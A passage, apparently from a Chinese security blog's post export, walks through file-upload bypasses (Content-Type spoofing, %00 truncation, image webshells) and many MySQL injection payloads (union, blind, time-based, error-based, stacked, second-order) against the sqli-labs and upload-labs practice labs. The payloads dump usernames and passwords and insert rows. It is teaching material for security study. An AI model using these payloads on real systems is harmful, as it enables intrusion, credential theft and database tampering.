class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif（gif图像）</span><br><span class="line">Content-Type: image/jpg（jpg图像）</span><br><span class="line">Content-Type: image/png（png图像）</span><br></pre></td></tr></table></figure></li></ul><h4 id="实例upload-labs-Pass02"><a href="#实例upload-labs-Pass02" class="headerlink" title="实例upload-labs-Pass02"></a>实例upload-labs-Pass02</h4><ul><li>通过源码可知，采用了<code>content-type</code>进行后端验证<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009151320.png" alt="image.png"></li><li>我们可以通过burp抓包对其<code>content-type</code>进行修改<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152042.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152057.png" alt="image.png"></li></ul><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="基本概念-9"><a href="#基本概念-9" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>%00不是代表空格，而是null，一个空字符，当程序执行到%00后，那么后面的数据就会停止，意思就是误当作结束符，把后面的数据直接忽略了，这就会导致漏洞产生。</li><li>在文件上传后，利用%00截断，在文件扩展名验证的时候，就会取文件的扩展名进行验证，但是在最后保存在本地的时候，%00就会截断文件名，只保存%00之前的内容。</li><li>%00只能用于php版本低于5.3的。这里我们需要把phpstudy切换一下版本,把magic_quotes_gpc关闭，以phpstudy为例。其他选项菜单—php扩展及设置—参数开关设置—把magic_quotes_gpc关闭。</li></ul><h2 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h2><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><h4 id="基本概念-10"><a href="#基本概念-10" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>图片的格式在防护中通常是不会使用后缀进行判断的依据，文件头是文件开头的一段二进制码，不同类型的图片也就会有不同的二进制头。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E1  </span><br><span class="line">PNG (png)，文件头：89 50 4E 47  </span><br><span class="line">GIF (gif)，文件头：47 49 46 38</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153123.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass13"><a href="#实例upload-labs-Pass13" class="headerlink" title="实例upload-labs-Pass13"></a>实例upload-labs-Pass13</h4><ul><li>制作木马图</li><li>在创建一个图片，和php文件，使用指令<code>copy 1.png/b + p13.php/a 2.png</code>进行合并<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153856.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153909.png" alt="image.png"></li><li>上传合并后的图片，这个图片当中就包含了php语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153956.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009155428.png" alt="image.png"></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><h4 id="基本概念-11"><a href="#基本概念-11" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>二次渲染就是在我们上传的图片后，网站会对图片进行二次处理，比如对图片的尺寸、格式、以及网站对图片进行定义的一些要求等进行处理，并且服务器会对里面的内容进行二次替换更新，在处理完后，会生成一个合规的图片在网站上显示出来。</li></ul><h4 id="实例upload-labs-Pass16"><a href="#实例upload-labs-Pass16" class="headerlink" title="实例upload-labs-Pass16"></a>实例upload-labs-Pass16</h4><ul><li>通过源码可知，会重新渲染图片，就是说我们上传的图片不会被保存，而是只有图片信息被提取</li><li>准备一个gif图片（最好是，因为比较容易），制作成图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220037.png" alt="image.png"></li><li>上传图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220114.png" alt="image.png"></li><li>将上传的图片马与后台保存的进行对比</li><li>使用<strong>Beyond Compare 4</strong>工具对比<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220244.png" alt="image.png"></li><li>发现图片文件前面大部分二次渲染的时候被过滤了，所以我们可以将php语句放在前部分，这样就不会被过滤了，然后保存<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220427.png" alt="image.png"></li><li>然后再将该文件进行上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220523.png" alt="image.png"></li><li>然后再次对比我们会发现，插入的php语句没有被过滤<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220856.png" alt="image.png"></li></ul><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><h4 id="基本概念-12"><a href="#基本概念-12" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>条件竞争就是在源代码中是存在校验的，但是校验是在文件上传后，才开始校验，也就是文件先上传至服务器中，然后服务器会对该文件进行校验，当符合的时候则会对文件进行重命名，当文件不符合要求的时候就对将文件进行删除。</li><li>而我们则需要在服务器对文件删除前进行访问，由于文件在访问过程中，服务器是无法删除的，所以就可以利用这个节点实现条件竞争。</li></ul><h3 id="突破getimagesize函数"><a href="#突破getimagesize函数" class="headerlink" title="突破getimagesize函数"></a>突破getimagesize函数</h3><h4 id="基本概念-13"><a href="#基本概念-13" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li><code>getimagesize</code>函数是用于获取图像大小及相关信息，成功返回一个数组，失败则返回false产生一条e_warning级的错误信息。</li><li>通过对图片及代码进行合成图片马，这个时候<code>getimagesize</code>函数既可以获取图片信息，文件后缀php也能够被解析成脚本文件，从而绕过<code>getimagesize</code>函数的限制。</li></ul><h4 id="实例upload-labs-Pass14"><a href="#实例upload-labs-Pass14" class="headerlink" title="实例upload-labs-Pass14"></a>实例upload-labs-Pass14</h4><ul><li>本关存有getimagesize函数，这个函数的意思是：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</li><li>使用办法和第十三关是一样的，前提都是需要存在相关的漏洞。</li></ul><h3 id="突破exit-imagetype-函数"><a href="#突破exit-imagetype-函数" class="headerlink" title="突破exit_imagetype()函数"></a>突破exit_imagetype()函数</h3><h4 id="基本概念-14"><a href="#基本概念-14" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务器exit_imagetype()函数检测上传图片类型是否为白名单图片格式来验证上传文件合法性。可以通过制作图片马绕过，再配合文件包含漏洞解析文件来获取服务器配置信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型（2）</title>
      <link href="/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/"/>
      <url>/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h1><ul><li>数据包当中的cookie内容经过了加密，可以将sql语句进行加密，然后注入</li><li>以sqli-labs-less21为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225650.png" alt="image.png"></li><li>在用户名密码栏当中输入admin<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225719.png" alt="image.png"></li><li>会回显我们的cookie数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225935.png" alt="image.png"></li><li>通过抓包工具可以看到cookie数据内容被加密了，加密方式为base64编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230631.png" alt="image.png"></li><li>解密得到admin原文，我们在后面加个单引号测试是否存在漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230916.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230938.png" alt="image.png"></li><li>可以看出，我们可以在后面加上单引号和后括号进行注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231807.png" alt="image.png"></li><li>将报错注入到cookie当中，然后进行加密<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231847.png" alt="image.png"></li><li>可以看到注入成功了</li></ul><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</li><li>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>在第一次进行数据库插入数据的时候，使用了<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，但是存入数据库时还是原来的数据，数据中带有<code>&#39;</code>或者<code>#</code>，然后下次使用再拼凑sql语句中，形成二次注入</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less24为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232516.png" alt="image.png"></li><li>我们没有用户名和密码，所有我们通过注册账户的方式，将干扰符号注入进去</li><li>我们猜测存在admin用户，所有我们注册admin’#<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232641.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232655.png" alt="image.png"></li><li>通过查询可以知道我们的账户注册成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232832.png" alt="image.png"></li><li>成功登录之后，进入到更改密码的界面，我们直接将密码改为<code>111111</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232929.png" alt="image.png"></li><li>此时我们发现，我们将<code>admin</code>的密码改了，说明二次注入成功</li><li>原因时代码在执行的过程中，将<code>&#39;#</code>进行了转义，没有对注册造成干扰，但是在第二次调用的时候没有进行过滤，造成二次注入。</li></ul><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>堆叠查询可以执行多条语句，多条语句之间以分号隔开。</li><li>堆叠注入就是利用在一条查询语句结束之后，在语句末尾加入分号之后再插入恶意的SQL语句，就可以达到攻击者的意图。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less38为例</li><li>在语句中加个分号<code>;</code>，在后面加入需要注入的恶意语句</li><li><code>?id=1&#39;; insert into users(id,username,password) values (38,&#39;less38&#39;,&#39;mima&#39;)--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234158.png" alt="image.png"></li><li>用于在数据库当中插入自定义的用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234356.png" alt="image.png"></li><li>可以看到已经注入成功了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型</title>
      <link href="/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><ul><li>联合注入，就是使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于<strong>有回显</strong>同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库<code>information_schema</code>，能很快的通过几条注入语句获取到想要的数据。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-1为例</li></ul><h3 id="查询表格的列数"><a href="#查询表格的列数" class="headerlink" title="查询表格的列数"></a>查询表格的列数</h3><ul><li><code>?id=2&#39; order by 3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224117.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224138.png" alt="image.png"></li><li>可以看出共有4列</li></ul><h3 id="爆出显示位"><a href="#爆出显示位" class="headerlink" title="爆出显示位"></a>爆出显示位</h3><ul><li><code>?id=-1&#39;union select 1,2,3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224250.png" alt="image.png"></li></ul><h3 id="获取当前数据库的数据库名和版本号"><a href="#获取当前数据库的数据库名和版本号" class="headerlink" title="获取当前数据库的数据库名和版本号"></a>获取当前数据库的数据库名和版本号</h3><ul><li><code>?id=-1&#39;union select 1,database(),version() --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224411.png" alt="image.png"></li></ul><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225123.png" alt="image.png"></li></ul><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><ul><li>?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225240.png" alt="image.png"></li></ul><h3 id="获取用户名和密码"><a href="#获取用户名和密码" class="headerlink" title="获取用户名和密码"></a>获取用户名和密码</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(username,password) from users --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225339.png" alt="image.png"></li></ul><h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><ul><li>如果没有回显，我们就不能使用联合注入了</li><li>这个时候可以选择布尔注入</li><li>布尔盲注主要用到<code>length()</code>,<code>ascii()</code> ,<code>substr()</code>这三个函数，首先通过<code>length()</code>函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说<strong>需要花费大量时间</strong>。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-5 为例</li></ul><h3 id="数据库名长度"><a href="#数据库名长度" class="headerlink" title="数据库名长度"></a>数据库名长度</h3><ul><li><code>?id=1&#39; and length((select database()))&gt;9--+</code>发现没有反应，表示长度小于或等于9<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230047.png" alt="image.png"></li><li><code>?id=1&#39; and length((select database()))=8--+</code>当等于8时，有通过反馈，表示数据库名长度为8<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230206.png" alt="image.png"></li></ul><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><ul><li><code>?id=1&#39;and ascii(substr((select database()),1,1))=115--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230349.png" alt="image.png"></li><li><code>substr(a,b,c)</code>a表示截取的字符串，b表示截取的位置，c表示截取的长度</li><li>一次截取一个字符进行查询，上面截图查询出第一个字符等于115，通过ASCII码可知为<code>s</code></li><li>通过这个方法查出全部八个字符</li><li>Ps:这个方法真的好麻烦哦</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>剩下的操作基本上差不多，可以参考下面的内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select database()))&gt;9--+</span></span><br><span class="line"><span class="string">#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select database()),1,1))=115--+</span><br><span class="line"><span class="comment">#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span class="string">#判断所有表名字符长度。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断表名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">#判断所有字段名的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),<span class="number">1</span>,<span class="number">1</span>))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断字段名。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">#判断字段内容长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select group_concat(username,password) from users),<span class="number">1</span>,<span class="number">1</span>))&gt;50--+</span><br><span class="line"><span class="comment">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><ul><li>有时候，输入任何东西显示的内容都是一样的，这样布尔注入就不能使用了</li><li>这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。</li><li>if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。</li></ul><h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-9为例</li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#判断参数构造。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select database()))&gt;9,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断数据库名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断数据库字符</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有表名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断表名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有字段名的长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断字段名。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(length((select group_concat(username,password) from users))&gt;109,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断字段内容长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li><li>如果结果为真，页面会延迟5秒显示，为假，则不会延迟，将直接显示</li></ul><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><ul><li>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是sql语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</li><li>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</li><li>以sqli-labs-less-17为例</li></ul><h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><ol><li>extractvalue()</li><li>updataxml()</li><li>count()+rand()+floor()+group by()导致的主键重复</li></ol><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ul><li><code>extractvalue(XML_document,XPath_string)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921232830.png" alt="image.png"></li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容</li><li>在最后一步爆字段内容时候，<strong>会报错</strong>，原因是mysql数据不支持查询和更新是同一张表。所以我们<strong>需要加一个中间表</strong>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,version(),0x5c)))#    </span></span><br><span class="line"><span class="string">爆版本</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,database(),0x5c)))<span class="comment">#   </span></span><br><span class="line">爆数据库</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   </span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">&#x27;users&#x27;</span>),0x5c)))<span class="comment"># </span></span><br><span class="line">爆字段名</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b) ,0x5c)))#</span></span><br><span class="line"><span class="string">爆字段内容该格式针对mysql数据库。</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) from (<span class="keyword">select</span> username,password from <span class="built_in">users</span>)a ),0x5c)))<span class="comment">#</span></span><br><span class="line">爆字段内容。</span><br></pre></td></tr></table></figure></li></ul><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ul><li><code>updatexml (XML_document, XPath_string, new_value)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</li><li>当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))# 爆版本</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,database(),0x5c),1))<span class="comment"># 爆数据库</span></span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#</span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;users&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">爆字段名</span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b),0x5c),1))#</span></span><br><span class="line"><span class="string">爆密码该格式针对mysql数据库。爆其他表就可以，下面是爆emails表</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;emails&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   </span></span><br><span class="line"><span class="string">爆字段内容。</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><ul><li>group by 报错注入比较复杂，可以先看看<a href="https://blog.csdn.net/m0_53065491/article/details/121893986" title="深入理解group by报错注入_m0_53065491的博客-CSDN博客">group by理解</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库</span></span><br><span class="line"><span class="string">123&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))<span class="comment">#      爆数据库版本</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables <span class="built_in">where</span> table_schema=database() group by concat(0x7e,(<span class="keyword">select</span> group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),0x7e,floor(rand(0)*2)))<span class="comment">#        爆出所有表</span></span><br><span class="line"></span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),0x7e,floor(rand(0)*2)))#    爆出所有字段名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.columns group by concat(0x7e,(<span class="keyword">select</span> 